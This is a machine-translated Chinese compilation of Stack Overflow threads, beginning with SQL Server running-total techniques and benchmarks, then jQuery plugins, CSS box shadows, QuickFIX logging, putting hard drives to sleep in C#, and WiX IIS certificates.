问题是 Over 子句的 SQL Server 实现[有些受限](http://wayback.archive.org/web/20090625062153/http://www.mydatabasesupport.com/forums/sqlserver-programming/189015-tsql-accmulations.html)。

Oracle（和 ANSI-SQL）允许您执行以下操作：

```
 SELECT somedate, somevalue,
  SUM(somevalue) OVER(ORDER BY somedate 
     ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) 
          AS RunningTotal
  FROM Table 
```

SQL Server 没有为您提供此问题的干净解决方案。我的直觉告诉我，这是光标最快的罕见情况之一，尽管我必须对大结果进行一些基准测试。

更新技巧很方便，但我觉得它相当脆弱。似乎如果您要更新一个完整的表，那么它将按照主键的顺序进行。因此，如果您将日期设置为主键升序，您将`probably`是安全的。但是您依赖于未记录的 SQL Server 实现细节（如果查询最终由两个 proc 执行，我想知道会发生什么，请参阅：MAXDOP）：

完整的工作样本：

```
drop table #t 
create table #t ( ord int primary key, total int, running_total int)

insert #t(ord,total)  values (2,20)
-- notice the malicious re-ordering 
insert #t(ord,total) values (1,10)
insert #t(ord,total)  values (3,10)
insert #t(ord,total)  values (4,1)

declare @total int 
set @total = 0
update #t set running_total = @total, @total = @total + total 

select * from #t
order by ord 

ord         total       running_total
----------- ----------- -------------
1           10          10
2           20          30
3           10          40
4           1           41 
```

你要求一个基准，这是低调。

最快的安全方法是游标，它比交叉连接的相关子查询快一个数量级。

绝对最快的方法是 UPDATE 技巧。我唯一担心的是，我不确定在所有情况下更新都会以线性方式进行。查询中没有任何内容明确说明。

底线，对于生产代码，我会使用光标。

测试数据：

```
create table #t ( ord int primary key, total int, running_total int)

set nocount on 
declare @i int
set @i = 0 
begin tran
while @i < 10000
begin
   insert #t (ord, total) values (@i,  rand() * 100) 
    set @i = @i +1
end
commit 
```

测试1：

```
SELECT ord,total, 
    (SELECT SUM(total) 
        FROM #t b 
        WHERE b.ord <= a.ord) AS b 
FROM #t a

-- CPU 11731, Reads 154934, Duration 11135 
```

测试 2：

```
SELECT a.ord, a.total, SUM(b.total) AS RunningTotal 
FROM #t a CROSS JOIN #t b 
WHERE (b.ord <= a.ord) 
GROUP BY a.ord,a.total 
ORDER BY a.ord

-- CPU 16053, Reads 154935, Duration 4647 
```

测试 3：

```
DECLARE @TotalTable table(ord int primary key, total int, running_total int)

DECLARE forward_cursor CURSOR FAST_FORWARD 
FOR 
SELECT ord, total
FROM #t 
ORDER BY ord

OPEN forward_cursor 

DECLARE @running_total int, 
    @ord int, 
    @total int
SET @running_total = 0

FETCH NEXT FROM forward_cursor INTO @ord, @total 
WHILE (@@FETCH_STATUS = 0)
BEGIN
     SET @running_total = @running_total + @total
     INSERT @TotalTable VALUES(@ord, @total, @running_total)
     FETCH NEXT FROM forward_cursor INTO @ord, @total 
END

CLOSE forward_cursor
DEALLOCATE forward_cursor

SELECT * FROM @TotalTable

-- CPU 359, Reads 30392, Duration 496 
```

测试 4：

```
declare @total int 
set @total = 0
update #t set running_total = @total, @total = @total + total 

select * from #t

-- CPU 0, Reads 58, Duration 139 
```

* * *

## 回答 #2

> 赞同：130
> 
> 时间：2012-04-25T05:43:26.143

在 SQL Server 2012 中，您可以将[SUM()](http://msdn.microsoft.com/en-us/library/ms187810.aspx?ppud=4)与[OVER()](http://msdn.microsoft.com/en-us/library/ms189461.aspx)子句一起使用。

```
select id,
       somedate,
       somevalue,
       sum(somevalue) over(order by somedate rows unbounded preceding) as runningtotal
from TestTable 
```

[SQL小提琴](http://sqlfiddle.com/#!6/62242/6)

* * *

## 回答 #3

> 赞同：40
> 
> 时间：2012-12-06T13:23:07.293

虽然 Sam Saffron 在这方面做得很好，但他仍然没有为这个问题提供**递归公用表表达式**代码。对于使用 SQL Server 2008 R2 而不是 Denali 的我们来说，它仍然是获得运行总数的最快方法，它比我的工作计算机上 100000 行的光标快大约 10 倍，而且它也是内联查询。
所以，这里是（我假设表中有一个`ord`列，它的序号没有间隙，为了快速处理，这个数字也应该有唯一的约束）：

```
;with 
CTE_RunningTotal
as
(
    select T.ord, T.total, T.total as running_total
    from #t as T
    where T.ord = 0
    union all
    select T.ord, T.total, T.total + C.running_total as running_total
    from CTE_RunningTotal as C
        inner join #t as T on T.ord = C.ord + 1
)
select C.ord, C.total, C.running_total
from CTE_RunningTotal as C
option (maxrecursion 0)

-- CPU 140, Reads 110014, Duration 132 
```

**`[sql fiddle demo](http://sqlfiddle.com/#!3/d41d8/6967)`**

**更新** 我也很好奇这个**带有变量**或**古怪更新的更新**。所以通常它可以正常工作，但我们如何确保它每次都能正常工作？好吧，这里有一个小技巧（在这里找到它 - [http://www.sqlservercentral.com/Forums/Topic802558-203-21.aspx#bm981258](http://www.sqlservercentral.com/Forums/Topic802558-203-21.aspx#bm981258)） - 你只需检查当前和以前的`ord`并使用`1/0`分配，以防它们与什么不同你期待：

```
declare @total int, @ord int

select @total = 0, @ord = -1

update #t set
    @total = @total + total,
    @ord = case when ord <> @ord + 1 then 1/0 else ord end,
    ------------------------
    running_total = @total

select * from #t

-- CPU 0, Reads 58, Duration 139 
```

从我所见，如果您的表上有正确的聚集索引/主键（在我们的情况下，它将是 index by `ord_id`）更新将一直以线性方式进行（从未遇到除以零）。也就是说，由您决定是否要在生产代码中使用它:)

**更新 2**我正在链接这个答案，因为它包含一些关于古怪更新不可靠性的有用信息 - [nvarchar concatenation / index / nvarchar(max) 莫名其妙的行为](https://stackoverflow.com/a/15163136/1744834)。

* * *

## 回答 #4

> 赞同：28
> 
> 时间：2009-06-05T18:04:08.633

SQL 2005 及更高版本中的 APPLY 运算符适用于此：

```
select
    t.id ,
    t.somedate ,
    t.somevalue ,
    rt.runningTotal
from TestTable t
 cross apply (select sum(somevalue) as runningTotal
                from TestTable
                where somedate <= t.somedate
            ) as rt
order by t.somedate 
```

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2009-05-14T00:02:02.490

```
SELECT TOP 25   amount, 
    (SELECT SUM(amount) 
    FROM time_detail b 
    WHERE b.time_detail_id <= a.time_detail_id) AS Total FROM time_detail a 
```

您还可以使用 ROW_NUMBER() 函数和临时表来创建任意列以用于内部 SELECT 语句的比较。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2014-09-12T20:49:11.560

使用相关的子查询。很简单，给你：

```
SELECT 
somedate, 
(SELECT SUM(somevalue) FROM TestTable t2 WHERE t2.somedate<=t1.somedate) AS running_total
FROM TestTable t1
GROUP BY somedate
ORDER BY somedate 
```

代码可能不完全正确，但我确信这个想法是正确的。

GROUP BY 是在一个日期出现多次的情况下，您只想在结果集中看到一次。

如果您不介意看到重复的日期，或者您想查看原始值和 id，那么以下就是您想要的：

```
SELECT 
id,
somedate, 
somevalue,
(SELECT SUM(somevalue) FROM TestTable t2 WHERE t2.somedate<=t1.somedate) AS running_total
FROM TestTable t1
ORDER BY somedate 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2009-06-05T18:14:17.340

您还可以非规范化 - 将运行总计存储在同一个表中：

[http://sqlblog.com/blogs/alexander_kuznetsov/archive/2009/01/23/denormalizing-to-enforce-business-rules-running-totals.aspx](http://sqlblog.com/blogs/alexander_kuznetsov/archive/2009/01/23/denormalizing-to-enforce-business-rules-running-totals.aspx)

选择的工作速度比任何其他解决方案都要快，但修改可能会更慢

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2017-08-30T09:17:11.887

如果您使用的是 Sql server 2008 R2 以上版本。那么，这将是最短的方法；

```
Select id
    ,somedate
    ,somevalue,
LAG(runningtotal) OVER (ORDER BY somedate) + somevalue AS runningtotal
From TestTable 
```

[LAG](https://docs.microsoft.com/en-us/sql/t-sql/functions/lag-transact-sql)用于获取上一行的值。你可以做谷歌了解更多信息。

[1]：

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2009-05-14T00:08:10.220

假设窗口在 SQL Server 2008 上像在其他地方一样工作（我已经尝试过），试一试：

```
select testtable.*, sum(somevalue) over(order by somedate)
from testtable
order by somedate; 
```

[MSDN](http://msdn.microsoft.com/en-us/library/ms189461.aspx)说它在 SQL Server 2008 中可用（也许还有 2005 年？），但我没有实例可供尝试。

编辑：好吧，显然 SQL Server 不允许在没有指定“PARTITION BY”的情况下使用窗口规范（“OVER(...)”）（将结果分成组，但不像 GROUP BY 那样聚合）。烦人——MSDN 语法参考表明它是可选的，但我目前只有 SqlServer 2000 实例。

我给出的查询在 Oracle 10.2.0.3.0 和 PostgreSQL 8.4-beta 中都有效。所以告诉 MS 赶上 ;)

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2018-02-25T12:54:47.777

尽管完成它的最佳方法是使用窗口函数，但也可以使用简单的**相关子查询**来完成。

```
Select id, someday, somevalue, (select sum(somevalue) 
                                from testtable as t2
                                where t2.id = t1.id
                                and t2.someday <= t1.someday) as runningtotal
from testtable as t1
order by id,someday; 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2009-05-14T00:37:09.343

以下将产生所需的结果。

```
SELECT a.SomeDate,
       a.SomeValue,
       SUM(b.SomeValue) AS RunningTotal
FROM TestTable a
CROSS JOIN TestTable b
WHERE (b.SomeDate <= a.SomeDate) 
GROUP BY a.SomeDate,a.SomeValue
ORDER BY a.SomeDate,a.SomeValue 
```

在 SomeDate 上有一个聚集索引将大大提高性能。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2011-02-03T18:38:35.567

我相信使用下面的简单 INNER JOIN 操作可以实现总和。

```
SELECT
     ROW_NUMBER() OVER (ORDER BY SomeDate) AS OrderID
    ,rt.*
INTO
    #tmp
FROM
    (
        SELECT 45 AS ID, CAST('01-01-2009' AS DATETIME) AS SomeDate, 3 AS SomeValue
        UNION ALL
        SELECT 23, CAST('01-08-2009' AS DATETIME), 5
        UNION ALL
        SELECT 12, CAST('02-02-2009' AS DATETIME), 0
        UNION ALL
        SELECT 77, CAST('02-14-2009' AS DATETIME), 7
        UNION ALL
        SELECT 39, CAST('02-20-2009' AS DATETIME), 34
        UNION ALL
        SELECT 33, CAST('03-02-2009' AS DATETIME), 6
    ) rt

SELECT
     t1.ID
    ,t1.SomeDate
    ,t1.SomeValue
    ,SUM(t2.SomeValue) AS RunningTotal
FROM
    #tmp t1
    JOIN #tmp t2
        ON t2.OrderID <= t1.OrderID
GROUP BY
     t1.OrderID
    ,t1.ID
    ,t1.SomeDate
    ,t1.SomeValue
ORDER BY
    t1.OrderID

DROP TABLE #tmp 
```

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2016-08-31T04:34:36.903

使用连接 另一种变体是使用连接。现在查询可能如下所示：

```
 SELECT a.id, a.value, SUM(b.Value)FROM   RunTotalTestData a,
    RunTotalTestData b
    WHERE b.id <= a.id
    GROUP BY a.id, a.value 
    ORDER BY a.id; 
```

有关更多信息，您可以访问此链接 [http://askme.indianyouth.info/details/calculating-simple-running-totals-in-sql-server-12](http://askme.indianyouth.info/details/calculating-simple-running-totals-in-sql-server-12)

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2019-06-16T21:33:17.680

这里有两种简单的方法来计算运行总数：

**方法 1**：如果您的 DBMS 支持分析函数，则可以这样编写

```
SELECT     id
           ,somedate
           ,somevalue
           ,runningtotal = SUM(somevalue) OVER (ORDER BY somedate ASC)
FROM       TestTable 
```

**方法 2**：如果您的数据库版本/DBMS 本身不支持分析功能，您可以使用 OUTER APPLY

```
SELECT     T.id
           ,T.somedate
           ,T.somevalue
           ,runningtotal = OA.runningtotal
FROM       TestTable T
           OUTER APPLY (
                           SELECT   runningtotal = SUM(TI.somevalue)
                           FROM     TestTable TI
                           WHERE    TI.somedate <= S.somedate
                       ) OA; 
```

注意：- 如果您必须分别计算不同分区的运行总计，可以按照此处发布的方式完成：[计算跨行的运行总计并按 ID 分组](https://stackoverflow.com/questions/56573545/calculating-running-totals-across-rows-and-grouping-by-id/56573932#56573932)

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-11-02T10:07:36.420

```
BEGIN TRAN
CREATE TABLE #Table (_Id INT IDENTITY(1,1) ,id INT ,    somedate VARCHAR(100) , somevalue INT)

INSERT INTO #Table ( id  ,    somedate  , somevalue  )
SELECT 45 , '01/Jan/09', 3 UNION ALL
SELECT 23 , '08/Jan/09', 5 UNION ALL
SELECT 12 , '02/Feb/09', 0 UNION ALL
SELECT 77 , '14/Feb/09', 7 UNION ALL
SELECT 39 , '20/Feb/09', 34 UNION ALL
SELECT 33 , '02/Mar/09', 6 

;WITH CTE ( _Id, id  ,  _somedate  , _somevalue ,_totvalue ) AS
(

 SELECT _Id , id  ,    somedate  , somevalue ,somevalue
 FROM #Table WHERE _id = 1
 UNION ALL
 SELECT #Table._Id , #Table.id  , somedate  , somevalue , somevalue + _totvalue
 FROM #Table,CTE 
 WHERE #Table._id > 1 AND CTE._Id = ( #Table._id-1 )
)

SELECT * FROM CTE

ROLLBACK TRAN 
```

# jquery-plugins - 使用 val() 方法接受和返回值的 jQuery 插件

> ID：860969
> 
> 赞同：1
> 
> 时间：2009-05-13T23:44:11.413
> 
> 标签：jquery-plugins

有谁知道如何创建一个 jQuery 插件来响应对 val() 方法的调用？

这是场景：

1.  使用 jQuery 选择器获取一组 DIV 并在其上应用插件（假设该插件名为“mytest”。
2.  在同一组 DIV 上使用 val() 方法，我想为它们设置一些属性。

做这种事情的正确方法是什么？

```
$.fn.example = function(options) {
    return this.each(function() {
        var edits = $("<input type='text'/><input type='text' />");
        $(this).html(edits);
    });
}

$(document).ready(function() {
    $("#example").example();
    $("#example").val("value1 value2");
    window.alert($("#example").val());
}); 
```

在这种情况下，第一次编辑应该有值“value1”，第二次编辑应该有值“value2”。vv 通过调用“val()”方法，我想找回字符串“value1 value2”。

最好的问候， 马蒂亚斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-17T10:30:57.003

我已经意识到通过使用其他方法然后使用它们调用它们

```
$("...").pluginname("methodname", ..parameters..); 
```

句法。它的工作原理与其他插件完全一样，所以我想这是正确的方法。在上面的示例中，代码如下所示：

```
$.widget("ui.example", {
    _init: function() {
    }
});

$.extend($.ui.example, {
    version: "1.7.1",
    defaults: {
        value: ""
    }
}); 
```

然后用法是：

```
$("#example").example("option", "value", "value1 value2");
var value = $("#example").example("option", "value");
window.alert(value); 
```

# css - 在 div 容器上投影？

> ID：860972
> 
> 赞同：47
> 
> 时间：2009-05-13T23:44:44.780
> 
> 标签：css, html, dropshadow

我有一个带有自动建议功能的搜索框，它会在其下方弹出一个带有多个搜索字符串建议（如谷歌）的 div。是否可以在带有 CSS 的自动建议框上放置阴影，或者我需要某种脚本？我尝试了一张背景图片，但建议的数量可以从 1 到 10 或 15 不等。

如果可能的话，我更喜欢在 IE6+ 和 FF2+ 中工作的东西。谢谢！

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2011-02-26T16:25:41.440

这适用于我所有的浏览器：

```
.shadow {
-moz-box-shadow: 0 0 30px 5px #999;
-webkit-box-shadow: 0 0 30px 5px #999;
} 
```

然后只需给任何 div 阴影类，不需要 jQuery。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-05-13T23:49:54.070

CSS3 有一个`box-shadow`属性。目前需要供应商前缀以获得最大的浏览器兼容性。

```
div.box-shadow {
    -webkit-box-shadow: 2px 2px 4px 1px #fff;
    box-shadow: 2px 2px 4px 1px #fff;
} 
```

[css3please](http://css3please.com/)提供了一个生成器。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-12-25T07:04:20.980

```
.shadow {
    -moz-box-shadow:    3px 3px 5px 6px #ccc;
    -webkit-box-shadow: 3px 3px 5px 6px #ccc;
    box-shadow:         3px 3px 5px 6px #ccc;
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T23:56:24.090

最广泛兼容的方法可能是在您的自动建议框下创建第二个 div，其大小与框本身相同，向下和向右轻推几个像素。您可以使用 JS 来创建和定位它，如果您使用的是相当现代的框架，这应该不会很困难。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2010-03-11T05:27:32.467

你可能想试试这个。似乎很简单，至少可以在 IE6 和 Moz 上运行。

```
<div id ="show" style="background-color:Silver;width:100px;height:100px;visibility:visible;border-bottom:outset 1px black;border-right:outset 1px black;" ></div> 
```

一般语法是：border-[postion]:[border-style] [border-width] [border-color] | 继承

可用的 [border-style] 列表是：

*   虚线
*   点缀
*   双倍的
*   槽
*   隐
*   插图
*   没有任何
*   一开始
*   岭
*   坚硬的
*   继承

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-05-14T00:28:32.103

您可以尝试使用 PNG 投影。IE6 不支持它，但它会很好地降级。

[http://www.positioniseverything.net/articles/dropshadows.html](http://www.positioniseverything.net/articles/dropshadows.html)

# quickfix - quickfixengine：可以限制日志记录吗？

> ID：860979
> 
> 赞同：2
> 
> 时间：2009-05-13T23:47:22.750
> 
> 标签：quickfix

在[**quickfixengine**](http://www.quickfixengine.org/)中是否有一个设置来指定日志级别以限制记录的消息数量？似乎我们登录了很多数据，所以我们想限制它一点。我认为记录太多消息会影响性能（没有任何支持或反对的硬数据）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-14T18:10:14.847

您没有说您使用的是哪种语言，但我相信这应该适用于 C++ 和 Java API。

您将需要实现自己的[LogFactory](http://quickfixengine.org/quickfix/doc/html/class_f_i_x_1_1_log_factory.html)和[Log](http://quickfixengine.org/quickfix/doc/html/class_f_i_x_1_1_log.html)类（前者负责创建后者的实例）。然后，您将自定义实例传递`LogFactory`给您的`Initiator`or`Acceptor`实例。您的`Log`班级是您将进行消息过滤的地方。

了解[Log](http://quickfixengine.org/quickfix/doc/html/class_f_i_x_1_1_log.html)以字符串形式接收消息，因此您需要使用字符串匹配操作进行过滤，或者将字符串转换回[消息](http://quickfixengine.org/quickfix/doc/html/class_f_i_x_1_1_message.html)，然后使用标签进行过滤，尽管这可能最终会减慢您的速度，而不仅仅是允许所有消息记录器。

# c# - 通过代码，我怎样才能让硬盘驱动器进入睡眠状态

> ID：860986
> 
> 赞同：6
> 
> 时间：2009-05-13T23:51:26.923
> 
> 标签：c#, windows, hardware

我的电脑中有很多硬盘驱动器 (7)。

当它们不使用时，电源选项会在一段时间后让它们进入睡眠状态。但是因为一切都会产生很大的噪音，所以我想在我想要的时候让他们睡觉，而不仅仅是在默认系统超时之后。

在 Windows（XP 及更高版本）上，最好在 C# 中，

**如何通过代码发送磁盘进入睡眠状态？**

非常感谢您的帮助...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T00:27:31.670

我不知道直接执行此操作的 API，但有一些工具可以执行此操作。我见过的一个是[Hard Disk Sleeper](http://www.softlookup.com/display.asp?id=9315)。我没有在我自己的机器上使用过它，所以我无法谈论它的质量或有效性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T00:35:07.460

如果您使用[IOCTL_ATA_PASS_THROUGH](http://msdn.microsoft.com/en-us/library/ms804551.aspx)将 ATA 命令直接发送到驱动器，则可以执行此操作。您将需要传递 SLEEP 命令。

我不认为这是一个 C# 项目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-14T00:45:16.507

AFAIK，这是一个设置 *spin down time8 的 ATA 命令 - 这意味着它是驱动器本身关闭。您可以使用 IOCTL_ATA_PASS_THROUGH 将命令直接发送到驱动器 - 但恐怕您最好将其设置为某个最小值（我不知道它是什么，但它应该在 ATA 规范中） ）。

编辑：看起来古老的[hdparm 支持它](http://linux.die.net/man/8/hdparm)，所以它必须在 ATA 规范中：

> -y 强制 IDE 驱动器立即进入低功耗待机模式，通常会导致其减速。
> 
> -Y 强制 IDE 驱动器立即进入最低功耗睡眠模式，使其完全关闭。在再次访问驱动器之前需要硬或软复位（如果/需要时，Linux IDE 驱动程序将自动处理发出复位）。

由于[hdparm](http://sourceforge.net/projects/hdparm/)（以及它用于与驱动器通信的底层 Linux 内核）是 GPL - 如果您手边没有 ATA 规范，您应该能够从那里记录细节。

或者，只需使用[win32 端口](http://hdparm-win32.dyndns.org/hdparm/)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-09-27T16:25:32.070

在 Windows 上，如果驱动器处于睡眠状态（不旋转），您可以简单地使用“GetDevicePowerState”函数返回 FALSE。

[https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getdevicepowerstate](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getdevicepowerstate)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T23:57:49.003

老实说，我认为仅使用 C#（即 .NET 框架）是不可能做到这一点的。

无论如何，我将从学习[WMI](http://msdn.microsoft.com/en-us/magazine/cc302051.aspx)和[ACPI](http://en.wikipedia.org/wiki/Advanced_Configuration_and_Power_Interface)开始。

这往往需要您深入研究较低级别的语言（至少要弄清楚与 P\Invoke 一起使用的 API 调用），因为它通常涉及与操作系统密切交互或可能直接与驱动程序交互.

也许您可以从研究[Windows 电源管理功能](http://msdn.microsoft.com/en-us/library/aa373163(VS.85).aspx)开始，尽管我认为它不允许控制单个硬盘驱动器。

# wix - IIS 中的 WIX 和证书

> ID：860996
> 
> 赞同：2
> 
> 时间：2009-05-13T23:54:01.240
> 
> 标签：wix, wix3

我正在尝试设置我的安装以使用 WIX 为我的站点配置其证书。

我可以在 IIS 中查看证书并可以访问 .cer 文件。这就是我对证书的所有了解，所以请不要回答任何问题。（即我不知道我的“BinaryKey”是什么）。

证书已安装在机器上。理想情况下，我只想在 wix 中有一种方法来配置要使用的已安装证书。如果有人知道怎么做，请在此处发布！

如果无法做到这一点，那么我会喜欢一个很好的例子来说明如何安装（也可能是卸载）证书。

感谢任何和所有的答案。

瓦卡诺

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-15T05:35:29.850

好的，所以在 WIX 证书领域没有什么大人物。

这是我所做的最终工作：

在我的网站下：

```
<iis:Certificate Id="MyCert" Name="MyCertName" StoreName="root"
StoreLocation="localMachine" BinaryKey="Certificate.Binary" /> 
```

在项目下：

```
<Binary Id="Certificate.Binary" SourceFile="$(var.CertificatePath)" /> 
```

`$(var.CertificatePath)`是指向我的 .cer 文件的设置。*******************